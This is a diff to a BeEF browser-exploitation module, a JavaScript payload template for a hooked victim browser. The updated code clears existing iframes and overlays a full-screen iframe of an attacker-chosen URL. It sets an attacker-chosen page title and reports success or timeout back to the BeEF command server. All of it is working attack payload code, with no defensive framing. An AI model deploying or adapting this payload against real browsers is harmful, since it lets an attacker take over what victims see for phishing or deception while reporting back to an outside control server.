@@ -1,18 +1,21 @@
 beef.execute(function() {
-	
-	/* 
-	TODO:
-	Automatically get and set iframe title.
-	*/
 
-	var result = 'Iframe successfully created!'	
-	var title = '';
+	var result = 'Iframe successfully created!';
+	var title = '<%= @iframe_title %>';
 	var iframe_src = '<%= @iframe_src %>';
-	var favicon = iframe_src + '/favicon.ico';
+	var sent = false;
 
-//	document.write('<html><head><title>' + title  + '</title><link rel="shortcut icon" href="' + favicon  + '" type="image/x-icon" /></head><body><iframe src="' + iframe_src  + '" width="100%" height="100%" frameborder="0" scrolling="no"></iframe></body></html>');
+	$j("iframe").remove();
+	
+	beef.dom.createIframe('fullscreen', {}, iframe_src, function() { if(!sent) { sent = true; document.title = title; beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result)); } });
 
-	document.write('<iframe src="' + iframe_src  + '" width="100%" height="100%" frameborder="0" scrolling="no"></iframe>');
+	setTimeout(function() { 
+		if(!sent) {
+			result = 'Iframe failed to load, timeout';
+			beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
+			document.title = iframe_src + " is not available";
+			sent = true;
+		}
+	}, <%= @iframe_timeout %>);
 
-	beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
 });
